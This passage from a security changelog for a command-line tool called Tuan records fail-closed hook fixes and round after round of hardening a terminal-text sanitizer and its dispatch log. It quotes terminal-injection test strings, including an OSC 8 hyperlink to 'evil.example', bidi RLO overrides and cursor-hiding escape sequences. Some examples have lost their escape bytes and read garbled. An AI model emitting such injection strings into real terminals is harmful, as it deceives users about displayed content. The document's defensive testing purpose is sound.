    pagination) and `choice_at` (hit-test) share ONE height/visible/start
    computation; `TabStrip.hit` and `render_plan` share ONE `targets()`.
    Both expose `*_matches_render()` self-checks in the regression suite,
    preventing "clicked item 3 but opened item 2" / "hit does not match
    what is drawn" defects. `tab_width=0` explicitly returns empty targets
    instead of dividing by zero; CJK display width uses
    `east_asian_width` as an APPROXIMATION (disclosed, not claimed
    byte-identical to unicode-width).
  - **Upstream keyboard policy disclosed (not silently copied into the
    approval path):** in MANDATORY migration (`can_opt_out=false`), Enter
    AND Esc BOTH accept, and an exhausted event stream also defaults to
    accept; only Ctrl+C / Ctrl+D exits. In opt-out mode `2` rejects and
    Esc CONFIRMS the highlighted option rather than cancelling. This is
    the OPPOSITE of this project's approval-overlay fail-closed contract
    ("no input / Esc can never become approval"). It is retained verbatim
    for the migration prompt ONLY, explicitly labelled by `policy_note()`
    and in the docs, and NEVER applied to the approval chain.
  - **Hard requirement continued:** `configkit_validate()` calls round
    12's `corekit.app.assert_wiring_intact()`, confirming all SIX
    pre-existing invariants (permission-policy injection, deny-all MCP
    policy, `ctx.confirm`, approval card, copy-mode confirmation, explicit
    ABORT) are still green. `tuan tui parity` still reports the wiring
    intact. **NO existing runtime object was replaced.**
  - Regression: `tests/test_tui_config_layer.py` **106 cases** pass;
    metric assertions in the parity / inputkit / corekit suites synced to
    10 / 93.9% / 55.8% / 21.2% with derived-consistency checks retained.
  - Next round: `streaming_async` + `tools_exec` +
    `history_transcript` (5), then the final 5 to clear `pending`,
    **still preserving the existing security wiring**.

  **Full-module "surpass Claude Code v2.1.319" plan + B1 (2026-11-07,
  round 14):**

  - New `CLAUDE_PARITY.md`: a detailed plan of 14 domains / 99 modules /
    12 waves, baseline locked to **v2.1.319 (2026-11-06)**. New
    `tuan_cli/parity_claude/` (catalog / evidence / six runtime probes /
    matrix) and `tuan claude parity`.
  - **"Surpass" has a HARD criterion**: `fully_superior` requires
    gaps == 0, all six runtime probes OK, at least one verified `ahead`
    module per dimension, all B-waves complete, AND a third-party
    adaptive red team. It is currently **false** (30 gaps; only 2 of 5
    criteria true) and MUST NOT be reached by relaxing the criterion.
    The probes actually call existing code: injecting a missing hook
    binary, tampering an HMAC record, feeding malformed config,
    corrupting an MCP policy file to check `locked`, counting real
    i18n/README files, validating the 165-module Codex TUI matrix.
  - **B1 fixes two real fail-open side doors** (`hooks/manager.py`):
    1. All four hook executors returned `None` on spawn failure,
       timeout, communicate error, HTTP error, missing kernel/model or
       nonzero exit; `run_pre()` treated `None` as "continue" — a broken
       SAFETY hook silently ALLOWED the tool call. Failures are now
       recorded as `HookFailure` (queryable via `failures()`),
       `hooks.on_failure` DEFAULTS TO `block` for PreToolUse with a
       structured reason and `failure_kind`; `allow` is an explicit,
       audited escape hatch. Watchdog timeouts are recorded on the MAIN
       thread because `last_failure` is thread-local (otherwise the
       fail-closed check could be bypassed across threads).
    2. `blocking` default False -> True: a hook returning
       `{"block": true}` was silently swallowed unless `blocking: true`
       was written explicitly. `blocking` governs ONLY a hook's own
       decision, NOT execution-failure fail-closed.
  - `config/security_schema.py` now validates the `hooks.on_failure`
    enum and per-hook overrides; explicit `allow` is surfaced as a
    security-downgrade warning.
  - **Behavioral change disclosed**: deployments relying on "a broken
    hook lets the call through" must set `hooks.on_failure: allow`; the
    pre-existing timeout assertion was updated and a new escape-hatch
    test added. NO policy was relaxed merely to turn a test green.
  - **Honest boundary (the one that matters most)**: Tuan still lacks a
    default OS-enforced sandbox, network-default-deny, credential
    masking on the egress path, and a proof that worktree creation
    stays inside the isolation boundary. All are explicitly listed as
    B2 gaps, NOT presented as advantages just because all six probes
    are green. Eight `not_applicable` items are reported honestly,
    not counted as lead items.
  - **Compliance**: Claude Code is Anthropic's PROPRIETARY product.
    This round uses ONLY public documentation / changelog / release
    notes for behavioral-contract comparison; **NO source code or
    trademark asset is copied**; Anthropic does not endorse this
    project (`NOTICE` section 14).
  - **Hard requirement continued**: `matrix.validate()` calls
    `corekit.app.assert_wiring_intact()`; all SIX pre-existing
    invariants remain green. Line B does not modify any A-line file.
  - Regression: `test_claude_parity.py` 58 cases + hooks batch 27 cases.
    Next wave B2: OS sandbox / network default deny / credential
    injection / worktree escape proof.




---

## 9. Testing & Regression Baseline

Core safety regression files (must be all green after changes):
`test_sandbox_system.py` / `test_mcp_checkpoint_convergence.py` / `test_security_network_ownership.py`
`test_permission_rules.py` / `test_security_integration.py` / `test_security_integration_tool_executor.py`
`test_security_hardening.py` / `test_security_auditor_provider.py` / `test_harden_network_policy.py`

> Note: `test_security_v2.py::TestSymlinkResolution` is Windows-environment-related and unrelated to safety logic; not a regression gate.


---

## 10. Runtime Slogans (Spinner Verbs) and TUI State Fixes

New `tuan_cli/tui/runtime_slogans.py` renders a Claude-Code-style runtime
slogan beside the Codex-style Working status line in the top HUD (10 languages;
the Chinese pool keeps the "slacking / marinating / reading the newspaper" joke).
Security-relevant points:

- **Custom verbs are terminal output and MUST be sanitized.**
  `sanitize_verb()` strips OSC 8 hyperlinks, CSI colour/clear sequences,
  C0/C1/DEL control characters, and clips by *display columns* (CJK = 2,
  max 40). This follows the lesson from
  `tui/inputkit/terminal_hyperlinks.py`: terminals interpret OSC/CSI, and
  the upstream `web()` did not validate link destinations.
- **Configuration is fail-safe, not fail-closed.** A malformed
  `spinnerVerbs` section in `~/.tuan/settings.json` (invalid mode, verbs
  not a list, out-of-range numbers, broken JSON) falls back to factory
  defaults and records `invalid:*` in `source`. No verdict is affected, so
  refusing commands here would be inappropriate.
- **Verbs are driven by real events**, not a timer: only `submit`, stream
  deltas and `begin_tool` advance the text; `render()` is a pure read. If no
  event arrives for `stall_ms` while busy, an honest "possibly slacking"
  diagnostic appears. This is a **heuristic observability hint**, NOT a
  heartbeat, timeout control, or security gate — it never interrupts,
  retries, or changes any verdict.
- Also fixed: the dead `_running` branch in `_render_footer` (tool runs
  displayed `Working (...)` instead of the tool name), two divergent width
  algorithms, and the incorrect comment claiming wcwidth was C-implemented.
  The mainline `_line_heights` already has a `(width, text)` height cache;
  the 16.2 -> 0.39 ms/frame figures from the local fork do **not** apply to
  the mainline and are not claimed as a performance result here.

Regression: `tests/test_runtime_slogans.py` 57 cases green. Compliance: Claude
Code is a proprietary product; only publicly documented behaviour is compared,
**NO source code is copied** (`NOTICE` section 15, Anthropic does not endorse
this project). **No new CLI subcommand** was added, and the 99-module baseline
/ `fully_superior=false` in `CLAUDE_PARITY.md` are unchanged.


---

## 11. Deep Pass: Concurrency, Evidence Redaction, Config Semantics

This round deepens the runtime-slogan feature only (section 10); no new
capability surface. Three security-relevant points:

- **Concurrency correctness.** `note_activity` is entered concurrently from
  UI, model and tool threads; `render`/`liveness` from the animation
  invalidate thread. The previous five mutable fields were unlocked
  compound read/writes, allowing "new seq + old verb" tearing and
  half-updated timestamps. All public methods are now linearised under an
  `RLock`, with monotonic clamping for out-of-order events / clock rollback.
  An 8-thread x 2400-op case checks the `(seq, verb)` invariant.
- **Evidence redaction.** The new ring buffer records only phase, event kind,
  `monotonic` time, seq, the current sanitised verb, and the **length and
  character class** of `detail` -- never the detail text (which may be a tool
  argument, path or token). It stays in process memory: no disk, no upload,
  no audit-log entry.
- **Tighter fail-safe config semantics.** Unknown phase keys (e.g. a typo
  `stremaing`) reject the whole section instead of being silently ignored --
  believing you tightened a budget when you did not is a dangerous false
  sense of security. Also fixed a real defect: a missing `mode` was always
  treated as `append`, which requires non-empty `verbs`, so a config that
  only set `stall_ms` was rejected as `invalid:empty-verbs` and silently
  fell back to factory defaults.

**Unchanged boundaries**: `stall` is a heuristic observability hint, NOT a
security gate, heartbeat or timeout control -- it never interrupts, retries
or changes any verdict. `slow` is only a visual downgrade. `reload()` is
explicit and keeps the old config on invalid input. `_animate` is explicitly
forbidden from refreshing liveness. Verification: 93 pytest cases +
22 pure-stdlib independent checks, all green.


---

## 12. Deep Pass 2: Sanitizer Boundary and Width Truth

This round deepens the runtime-slogan sanitizer and header rendering only;
no new capability surface. Four security-relevant points:

- **Bidi overrides were a real attack surface.** The old `sanitize_verb`
  emitted `U+202E RLO`, `U+202D LRO`, `U+2066..2069` isolates, ZWSP/ZWJ/
  BOM/WJ/soft-hyphen, private-use and unassigned code points verbatim.
  Terminals re-order display according to bidi controls, so what the user
  sees differs from the string content (the UI variant of Trojan Source).
  Categories `Cc/Cf/Cs/Co/Cn` are now dropped, along with variation
  selectors.
- **Escape sequences must be consumed whole.** The old code removed only
  the ESC byte, leaving `ESC ( B` -> `(B`, `ESC c` -> `c`, `ESC 7` -> `7`
  in the text. OSC -> CSI -> generic ESC -> C0/C1 now removes them fully;
  output is guaranteed to contain no ESC.
- **Idempotence is constructed, not accidental.** `_sanitize_once` iterates
  to a fixed point (max 3 rounds); non-convergence is fail-closed to an
  empty string. 500 fuzz inputs, zero non-idempotent cases.
- **The built-in diagnostic was also a side door.** The prior round claimed
  "header shows only a short phrase", but `render()` pushed the full
  ~52-column `_STALL_TEXT` into a single-line header, bypassing the
  sanitizer's width/invisible-character constraints. Custom verbs and
  built-in diagnostics now share `_fit_headline()` (sanitize + 40 cols);
  the full information stays in `Liveness.diagnostic`.

Config hardening: 1 MiB read cap; `bool` masquerading as `int`, numeric
strings, float truncation and `NaN`/`Infinity` are rejected. Custom verbs
and the 10-language built-in bank share the same sanitize/width invariants.

**Unchanged boundaries**: `stall` is a heuristic observability hint, NOT a
security gate, heartbeat or timeout control -- it never interrupts, retries
or changes any verdict. Evidence stays redacted in process memory.
`_animate` remains forbidden from refreshing liveness. Dropping VS16
degrades emoji presentation to text style -- a deliberate trade for
predictable width. Verification: 139 pytest cases + 20 pure-stdlib
independent checks, all green.


---

## 13. Every Slogan Has a Counterpart: Strict Dispatch and No Alert Downgrade

This round wires the user-supplied 860-slogan library to real runtime
events. Three security-relevant points:

- **Unknown events fail closed.** The old
  `pick("totally.unknown")` silently returned `"Here."` -- a slogan with
  no corresponding event was rendered. `pick_for_event` now raises
  `UnboundSloganEvent`; `pick_strict` raises on unknown contexts;
  `audit()` verifies `orphan_slogans=0`, `contexts_without_event=0`,
  `events_without_pool=0` entry by entry.
- **Structured alerts are never downgraded.** The library design note
  said "do NOT touch structured security-blocking alerts (that is a
  downgrade, not an optimisation)". This is now an executable contract:
  `SECURITY_EVENTS` always returns empty text + `security-notice`,
  and `audit().unsafe_bindings` asserts none is bound to a slogan.
- **One sanitizer, not a third source of truth.** The sanitizer from
  sections 10-12 was extracted to `tuan_cli/ui/slogans/_clean.py`;
  the liveness engine re-exports the **same function objects**
  (`sanitize_verb is _clean.sanitize_verb` -> True). All 1108 bank
  verbs pass that single exit; `audit().clipped_slogans=0` and
  `sanitizer_shared=True`. Three overlong built-in verbs (which would
  be clipped mid-sentence) were replaced with complete short forms.

Also fixed: unlocked module-level dicts -> `RLock` linearisation;
`min_interval` rejecting `-1/NaN/Inf/"5"/True` (old `Inf` froze the
spinner forever); real LRU windows that preserve history on resize.
The dispatch log is bounded to 64 entries and desensitised (event,
context, reason, origin, sequence only).

**Unchanged boundaries**: `stall` is a heuristic observability hint,
not a security gate; the TUI only dispatches and records, it does NOT
replace existing i18n copy; no real-device soak test; no external
adaptive red team. Verification: 175 pytest cases + 26 pure-stdlib
independent checks, all green.


---

## 14. Runtime Closure: No Silent Errors, Traceable Records, Alerts Still Safe

This round does not change any verdict; it makes last round's
"every slogan has a counterpart" real at runtime.

- **Errors are no longer silent.** `_slogan_dispatch` used
  `except Exception: return None`, swallowing the `UnboundSloganEvent`
  that `pick_for_event` raises on a typo, with zero log entries. Unknown
  events and library failures now record `error:<kind>` via
  `_slogan_error()`; `slogan_errors()` exposes them; `strict=True`
  re-raises (dev/test). Production does not crash the UI but NEVER
  silently swallows -- silent failure is exactly what security
  observability must avoid.
- **Records are traceable and session-scoped.** `_slogan_log` now
  carries `entry_id`; `slogan_trace()` resolves back to the triggering
  event group. Logs are bucketed by `owner` under `RLock`, and
  `reset_dispatch_log(owner)` no longer wipes another session.
  Snapshots return tuples, not the internal mutable object.
- **Structured alerts are still never downgraded.** All 6
  `SECURITY_EVENTS` still return empty + `security-notice`;
  `audit().unsafe_bindings` stays 0. Empty text now means either
  "security event" or "error" -- distinguished by
  `slogan_trace().reason`, not guessed.

Also fixed: `audit()`'s O(n^2) `ids.count(i)` -> `Counter`, with the
1695-entry sanitizer check cached at index build time; linear
`entry_id` lookup -> O(1) `_BY_ID`/`_BY_TEXT` indexes. A new 11th
invariant `index_consistent` is enforced. `SloganEntry.events` fixes
the ownership ambiguity for shared contexts (`model.streaming`,
`turn.retry`). `rng`/`now`/`owner` injection makes dispatch
deterministically replayable (injected rng uses a one-shot local
avoid-repeat window so hidden global state cannot pollute replay).

**Honest limits**: a 12-thread stress test with
`setswitchinterval(1e-6)` did NOT reproduce a log-length violation
(observed peak remained 64); the locks remove reliance on CPython GIL
implementation details rather than fixing an observed failure. 20
`audit()` calls still take 355.6 ms of `pool_entries` work; no second
cache layer was added because that would make audit results depend on
cache timing. `stall` is still not a security gate; TUI replaces no
existing i18n copy; no real-device soak test; no external adaptive red
team. Verification: 194 pytest cases + 42 pure-stdlib checks + 22/20
prior checks, all green.


---

## 15. Closure Patch: Unresolvable Slogans Never Render, Errors Visible Twice

This round changes no verdict; it patches holes left in last round's
runtime correspondence.

- **Unresolvable slogans fail closed.** Last round built `_BY_TEXT` on
  RAW text but resolved it with SANITIZED text. `clipped=0` made them
  coincide by luck; injecting a ZWSP entry reproduced `reason='ok'`
  with `entry_id=''`. Dispatch now uses `_BY_CLEAN` (sanitized index);
  a miss yields `index-miss` + EMPTY text + `_INDEX_MISSES`, never a
  fake `"ok"`. Clean-text collisions are detected in
  `_CLEAN_COLLISIONS`.
- **Errors visible in both layers.** `_slogan_error()` previously wrote
  only the TUI instance log; measured `mapping.dispatch_log()` had 0
  error rows. `record_error()` now mirrors `error:<kind>` into the
  global log. All 6 `SECURITY_EVENTS` still return empty +
  `security-notice`, `audit().unsafe_bindings` stays 0, and they are
  NEVER conflated with `error:*`. `strict=True` records both layers.
- **Log size is bounded.** `_dispatch_log` is now an LRU `OrderedDict`
  with `_MAX_OWNERS=128` (previously only per-bucket length was capped);
  `close()` releases its own bucket; `dispatch_log_stats()` exposes
  owner/decision/peak counts. 2000 sessions now leave 128 owners.

Also fixed: `_MAX_WINDOWS` moved from magic 64 to 384 computed from the
real key space (320) -- measured that 64 evicted the starting window
3/3 sweeps, defeating avoid-repeat. `audit().index_consistent` now
requires all three indexes to equal the registry, zero collisions, zero
runtime misses, and complete event groups. `AuditReport` gained
`clean_collisions` / `runtime_index_misses` / `dispatch_stats`.

**Honest limits**: `index-miss` fail-closed only suppresses a slogan, it
changes no verdict; `release_owner()` frees the global bucket but the
instance `_slogan_log` remains with the object; `_MAX_OWNERS=128` and
`_MAX_WINDOWS=384` are bounded tradeoffs, oldest history is still
evicted. No list corruption was reproduced under concurrency (as in
section 14); no real-device soak test; fork changes still unmerged; no
external adaptive red team. Cold vs hot `audit()` timings are a
measurement-scope difference, NOT a claimed performance improvement.
Verification: 215 pytest cases + 52 pure-stdlib checks + 22/20 prior
checks, all green.


---

## 16. Log-Field Sanitization, Self-Healing Audit, Evidence Preservation

This round changes no verdict; it patches holes left in the prior three
rounds of runtime correspondence.

- **Log fields are no longer an injection channel.** `record_error()`
  takes `event` / `kind` / `context` from a public API. Measured: a
  5030-codepoint string carrying an `ESC ]8;;` hyperlink and `U+202E`
  RLO was stored verbatim in BOTH log layers, and the exception message
  reached tracebacks. `_clean.sanitize_log_field()` now sanitizes all
  of them, sharing the `_clean_once` core with UI copy (no second
  sanitization truth); the TUI degraded path also sanitizes before
  writing. Measured: 5030 -> 121 codepoints, ESC/RLO/OSC8 all removed,
  and both layers carry the identical event string.
- **Audit self-heals without losing evidence.** `audit().ok` previously
  depended on cumulative `_INDEX_MISSES`, so one repaired historical
  miss reported unhealthy forever, and the only recovery
  (`reset_runtime_counters()`) was hard-wired to
  `reset_dispatch_log()` (measured `decisions: 21 -> 0`). Now
  CONSECUTIVE unresolved misses are fatal (cleared by one successful
  lookup) while CUMULATIVE history is informational and never auto-
  cleared. `acknowledge_runtime_misses()` confirms explicitly without
  touching logs; `reset_runtime_counters()` no longer wipes logs by
  default (`include_dispatch_log=True` is explicit).
- **Session-exit evidence is preserved.** `close()` recorded
  `session.exit` then deleted the bucket, so the global log never saw
  it. The full bucket snapshot is now sealed into the instance
  (`slogan_closed_trace()`) before the global bucket is released; the
  128-owner bound is unchanged.
- **LRU reads refresh recency.** Previously only writes refreshed, so a
  heavily-read active session was evicted as least-recently-used.
  `dispatch_log(owner)` now refreshes; the no-arg full snapshot
  deliberately does NOT, or one full read would refresh every bucket.

Also: `clipped` (text needs sanitizing) is now informational, while
`unrenderable` (empty/over-wide after sanitizing) and clean-text
collisions are fatal. Distribution-side secondary codepoint truncation
was removed so dispatch and `_BY_CLEAN` share the single
`sanitize_verb` exit; overlong entries no longer fail with a silent
`index-miss`.

**Honest limits**: `unresolved_misses` is CONSECUTIVE -- intermittent
misses are cleared by a later success, cumulative history is the full
record. `slogan_closed_trace()` preserves only the `close()` snapshot.
`sanitize_log_field` bounds codepoints, not display columns (logs do
not render in a terminal). `index-miss` fail-closed only suppresses a
slogan, it changes no verdict. No list corruption was reproduced under
concurrency; no real-device soak test; fork changes still unmerged; no
external adaptive red team. Verification: 234 pytest cases + 64
pure-stdlib checks + 22/20 prior checks, all green.


---

## 17. Owner Normalization, Passive-Eviction Trace, Single Release Exit

This round changes no verdict; it patches holes left in the prior four
rounds of runtime correspondence.

- **`owner` is no longer an injection channel.** It is a public arg of
  `pick_for_event` / `record_error`. Measured: injecting a
  5033-codepoint string with `ESC ]8;;` hyperlink and `U+202E` RLO
  left `SloganDecision.owner`, the bucket KEY, and `slogan_trace()`
  output all carrying raw control characters -- the prior round
  sanitized event/kind/context but missed this path entirely. Writes
  and queries now share `norm_owner()`: clean input is returned
  unchanged, dirty input becomes a fixed-length
  `owner:<sha1(raw)[:16]>` key (22 codepoints, strictly idempotent,
  no collisions between distinct dirty strings). Measured: 5033 -> 22
  codepoints, ESC/RLO/OSC8 all removed, `dispatch_log(evil)` and
  `dispatch_log(d.owner)` hit the same bucket.
- **Do not break the query path while sanitizing.** The first fix
  built a 74-codepoint key; a second normalization re-truncated at the
  64 limit and RE-HASHED, so `dispatch_log(evil)` returned 0 while
  `dispatch_log(d.owner)` returned 1 -- writes and queries silently
  diverged. Switching to a fixed-length fingerprint key made
  `norm_owner` strictly idempotent. This defect was INTRODUCED by
  this round's own fix and caught by measurement; recorded honestly.
- **Log-field sanitizing no longer crashes on dirty config.**
  `sanitize_log_field` used bare `int(limit)`: `None` / `nan` / `inf`
  raised TypeError / ValueError / OverflowError, while `'5'` /
  `True` / `-1` were silently accepted. `_coerce_log_limit()` now
  validates strictly, clamps to `[8, 4096]`, and falls back to 120 for
  any dirty value without raising -- consistent with `load_config`.
- **LRU passive eviction is no longer a silent black hole.** The prior
  round sealed snapshots only for explicit `close()`. Measured: the
  129th session evicted a bucket containing `turn.completed`, with no
  trace at all. `EvictionRecord` (owner / dropped / last_reason /
  at_ms, NO text, NO entry_id) now goes into bounded `_EVICTED` (64);
  `evicted_owner_log()` and `dispatch_log_stats()['evicted_recent']`
  expose it. Decision contents are deliberately NOT resurrected (that
  would defeat the 128-owner bound). `evicted_recent` is an
  observation and does NOT participate in `audit().ok`.
- **Single release exit + complete concurrency contract.** `close()`
  collapsed from `dispatch_log + release_owner` to the single
  `mapping.take_owner_log()`; `_slogan_sealed` writes now hold
  `_slogan_lock` (reads already did), and the unused `keys` variable
  in `slogan_closed_trace()` was removed.

**Honest limits**: dirty owners become `owner:<fp16>` and their raw
text never enters logs (a readability tradeoff); clean owners are
untouched. Only the most recent 64 evictions are recorded and
decision contents are not restored. `_slogan_sealed` remains an
instance-local snapshot. No list corruption was reproduced under
concurrency; no real-device soak test; fork changes still unmerged;
no external adaptive red team. Verification: 256 pytest cases + 73
pure-stdlib checks + 22/20 prior checks, all green.


---

## 18. Clean-Before-Truncate, Injected Clock, Eviction Reason Summary

This round changes no verdict; it patches holes left in the prior five
rounds of runtime correspondence.

- **Truncating BEFORE cleaning hid legitimate content.**
  `sanitize_log_field` used `raw[:lim*4]`. Measured:
  `' '*1000 + 'OK'` with limit=120 scanned only the first 480
  codepoints; the leading junk consumed the budget, cleaning yielded
  empty, and the ONLY valid trailing text ('OK') was dropped. Now
  `_clean_once` is iterated to a fixed point FIRST, then truncation
  applies. `_SCAN_CAP = 65536` bounds regex work (measured
  `_clean_once`: 64KiB≈17ms, 1MiB≈0.32–0.37s, 2MiB≈0.66–0.68s). Within
  64KiB semantics are exact; beyond it we coarse-cut for DoS
  protection -- an EXPLICIT fail-closed boundary (measured
  `' '*70000+'OK' -> ''`). We do NOT claim fidelity for arbitrary
  input lengths. Truncation output stays strictly idempotent.
- **A run of ESC bytes ate a trailing character.** Exposed by the
  fix above: `''*900 + 'END' -> 'ND'` because the last ESC plus
  'E' matched `ESC E` (NEL) in `_ESC_SEQ_RE`. Added
  `_ESC_RUN_RE = {2,}` AFTER the OSC/CSI substitutions (real
  `[`/`]`-introduced sequences are already stripped). Measured:
  `-> 'END'`, while `'[31m' -> ''` (CSI not harmed).
  A SINGLE `'END'` remains `'ND'`: an ECMA-48 ambiguity this
  round did NOT change. The ESC is removed, so no control sequence
  is echoed -- NO security risk, only a fidelity boundary. Tests
  assert "no control characters" and do not freeze 'ND' as expected.
- **The "lone ESC survives" candidate was MEASURED FALSE and NOT
  fixed.** Suspecting `_CTRL_RE` omitted 0x1b, we measured
  `sanitize_verb('abc') == 'abc'`, `'' -> ''`: the class
  `-` already covers 0x1b. NOT ONE LINE was changed for it;
  two regressions merely lock in the existing correct behavior so
  nobody later "fixes" a non-existent hole.
- **Eviction traces now share the injected clock.** Previously they
  used `time.monotonic()`: with `now=1000.0`, decision.at_ms was
  1000000 but EvictionRecord.at_ms was 76564 -- deterministic replay
  was half broken. `_record(d, at_ms=...)` now takes the caller's
  clock; all 5 `pick_for_event` branches and `record_error` pass
  `at`. Two replays produce identical metadata.
- **`reason_counts` no longer hides error signals.** A bucket with
  `ok / error:boom / ok` evicted left only `last_reason='ok'`.
  `EvictionRecord` now carries a sorted
  `Tuple[Tuple[str,int],...]`: `(('error:boom',1),('ok',2))`,
  `sum == dropped`. No text, no entry_id; `audit().ok` unaffected.
- **Wording made exact.** Added `OWNER_LIMIT = 64`; the docstring now
  says "clean AND <= 64 codepoints is returned unchanged". Measured:
  `'a'*64` unchanged, `'a'*65 -> owner:<fp16>`. No functional change.

**Honest limits**: beyond `_SCAN_CAP` we still coarse-cut; the single
ESC ECMA-48 ambiguity remains (but no control character survives);
full-string sha1 cost for oversized owners is NOT fixed (measured
2 MiB ≈ 1.7 ms). `reason_counts` summarizes reasons only, does not
resurrect decision contents, keeps only the latest 64 evictions, and
`evicted_recent` does not affect `audit().ok`. `tui.py` and
`runtime_slogans.py` files are unchanged, but their re-exported
`sanitize_verb` is more faithful for consecutive-ESC input because
it shares `_clean_once`; all other behavior is unchanged (139 prior
regressions green). No list corruption was reproduced under
concurrency; no real-device soak test; fork changes still unmerged;
no external adaptive red team. Verification: 276 pytest cases + 80
pure-stdlib checks + 22/20 prior checks, all green.


---

## 19. ESC+ Introducer, Clock Strictness, Bounded Digest, Cumulative Evidence

This round changes no verdict; it patches holes left in the prior six
rounds of runtime correspondence.

- **The previous round's ESC_RUN fix had a coverage gap.**
  `]8;;evilOK` returned `'K'`, `[31mRED`
  returned `'ED'`, `[?25lHIDE` returned `'IDE'`. The OSC/CSI
  regex matched starting at the LAST ESC of the run, leaving a lone
  ESC that `_ESC_SEQ_RE` then paired with the first printable trailing
  character. The prior round only tested `[31m -> ''` (no
  trailing text) before claiming coverage. The introducer is now
  `+`, so a whole "ESC run + real sequence" is stripped in one
  pass. Measured: all five cases restore full trailing text; single-ESC
  behavior unchanged; everything idempotent. A SINGLE `END -> 'ND'`
  ECMA-48 ambiguity is still NOT changed -- ESC is removed so no
  control sequence is echoed (no security risk).
- **Public clock arguments no longer run naked.** `now=nan` raised
  ValueError, `now=inf` OverflowError, `now='1000'` produced a
  4000-digit integer (string `*1000` amplification);
  `record_error(at_ms='1000')` stored a STRING in
  `SloganDecision.at_ms`, and `True` became 1. `_coerce_ms(value,
  is_seconds)` now rejects bool / non-numeric / non-finite / negative
  / over-cap values and falls back to the real monotonic clock. All
  three entry points (`pick_for_event`, `record_error`, the eviction
  stamp inside `_record`) share it. Nine dirty values measured: all
  produce a legal positive `int`, no exception, no amplification.
- **A defect INTRODUCED by this round's own fix and caught by
  measurement.** The first version used
  `_coerce_ms(...) or _fallback_ms()`, which treated legal ZERO as
  falsy (`now=0 -> 1072138`). Switching to an explicit `ms is None`
  check gives `now=0 -> 0`, `now=1 -> 1000`, and eviction `at_ms=0`.
  Same lesson as the previous round's A': never use a validation
  result directly as a boolean.
- **Owner digest is bounded.** Previously sha1 over the FULL encoded
  string with no cap (measured 1 MiB ~12.7 ms on every write/query).
  `OWNER_SCAN_CAP = 4096`: oversized strings hash
  "head 2048 + total length + tail 2048". Measured: two 100k strings
  differing only in the tail still do not collide, output stays 22
  codepoints and strictly idempotent, 64KiB->8MiB all cost ~12-14 ms
  (a FIXED bound, not "only 4096 scanned" -- `_SCAN_CAP=65536`
  still applies). Honest limit: two oversized strings sharing head,
  tail and length but differing only in the MIDDLE collide. We do NOT
  claim zero collisions.
- **Cumulative eviction evidence.** `evicted_total()` and
  `dispatch_log_stats()['evicted_total']` mirror the
  continuous/cumulative two-layer model used for `_INDEX_MISSES`.
  The ring buffer answers "latest 64"; the counter answers "how many
  in total" and does not roll away. It does NOT affect `audit().ok`
  (eviction is normal bounded behavior). Only an explicit full
  `reset_dispatch_log()` zeroes it.

**Four candidates were MEASURED FALSE and NOT changed**: three
fixed-point iterations never murder legal text; leading combining
marks / CGJ / ZWJ were already stripped; lone-surrogate owners do not
collide and stay idempotent; `record_error`'s `kind` was already
sanitized. Regressions merely lock in existing correct behavior.

**Honest limits**: dirty clock injection falls back to real time and
is NOT replay-deterministic (replay is guaranteed only for legal
injection). Beyond `_SCAN_CAP` we still coarse-cut. The single-ESC
ECMA-48 ambiguity remains. `evicted_total` is an observation; detail
records are still capped at 64 and decision contents are not
resurrected. `tui.py` / `runtime_slogans.py` files unchanged (not in
this push), though their shared `sanitize_verb` is more faithful for
consecutive-ESC input; 139 prior regressions green. No list
corruption reproduced under concurrency; no real-device soak test;
fork changes still unmerged; no external adaptive red team. NO
performance improvement is claimed. Verification: 300 pytest cases
+ 88 pure-stdlib checks + 22/20 prior checks, all green.


---

## 20. Bucket-Trim Evidence and Two Deliberately Unfixed Fidelity Candidates

This round changes no verdict and NOT ONE LINE of the cleaning layer.
It closes one observability gap and records two measured-but-rejected
fixes.

- **Bucket trimming silently dropped error signals.** Measured: one
  `error:boom` followed by 84 decisions left no error in
  `dispatch_log('s0')`, while `evicted_recent=0` AND
  `evicted_total=0` -- NO eviction happened at all. The culprit is
  `_DISPATCH_CAP=64`'s `del bucket[:-cap]`; the prior round's
  `EvictionRecord.reason_counts` only summarizes "what is in the
  bucket at eviction time" and cannot cover this layer. `_record` now
  captures `dropped` before trimming and accumulates global counters
  (`bucket_trims` / `trimmed_decisions` / bounded `reason_counts`)
  plus a per-owner summary that travels with
  `EvictionRecord.trimmed_dropped` / `trimmed_reason_counts` when the
  session is LRU-evicted. Measured:
  `(('error:boom',1),('ok',21))` went from completely invisible to
  queryable in two places. Added `bucket_trim_stats()` and cumulative
  `decisions_total`; `audit().as_dict()` carries them automatically.
  ALL are observations and do NOT affect `audit().ok`.
- **An off-by-one INTRODUCED by this round's own fix and caught by a
  new regression**: the first reason-cap check allowed 64 concrete
  reasons PLUS `<other>` = 65 keys. Now counting concrete reasons
  only, with `<other>` as one extra bucket (total <= 65, concrete
  <= 64).

TWO CANDIDATES WERE MEASURED REAL BUT DELIBERATELY NOT FIXED, because
fixing them would WEAKEN the security boundary for zero real gain:

1. **Unterminated OSC swallows the whole line**
   (`'\x1b]8;;https://evil.example'+'OK' -> ''`, and
   `sanitize_verb` too since both share `_clean_once`). Under ECMA-48
   an OSC must be terminated by BEL/ST; without a terminator ALL
   following bytes are parameters, so stripping the whole run is
   spec-correct. Measured the attempted fix (mandatory terminator +
   4096 cap): it leaves **904 codepoints of OSC parameter residue**
   in the log (weaker sanitizing), and `sanitize_log_field`'s
   120-codepoint truncation still makes trailing `END` unreachable.
   Zero benefit, positive risk.
2. **ZWJ emoji is split by Cf removal** (`👩\u200d💻 -> 👩💻`,
   family / rainbow-flag sequences too). Checked all 1695 entries:
   **ZERO ZWJ, ZERO VS16, ZERO ESC**. Fixing it would relax Cf
   cleaning (retaining ZWJ) and force changes to `_clusters`,
   `display_cols`, a 500-string width cross-regression and the
   idempotence contract -- while bidi isolate / RLO / ZWSP must keep
   being deleted. Zero real-slogan benefit, positive risk.

`test_A_attempted_fix_would_leak_osc_parameters` and
`test_B_registry_contains_no_zwj_variation_or_esc` turn both
judgments into EXECUTABLE evidence rather than prose.

**Honest limits**: per-owner trim summaries travel with
`EvictionRecord` ONLY on LRU eviction; explicitly released sessions
(`release_owner` / `take_owner_log`) drop theirs (global cumulative
evidence remains), and the global summary is NOT attributed to a
specific owner. `<other>` merges tail categories. The unterminated-OSC
ECMA-48 ambiguity, ZWJ emoji splitting and coarse-cut beyond
`_SCAN_CAP` remain UNSOLVED, each locked by a regression.
`_clean.py`, `tui.py` and `runtime_slogans.py` are byte-identical and
NOT in this push. No list corruption reproduced under concurrency; no
real-device soak test; fork changes still unmerged; no external
adaptive red team. NO performance improvement is claimed (trimming
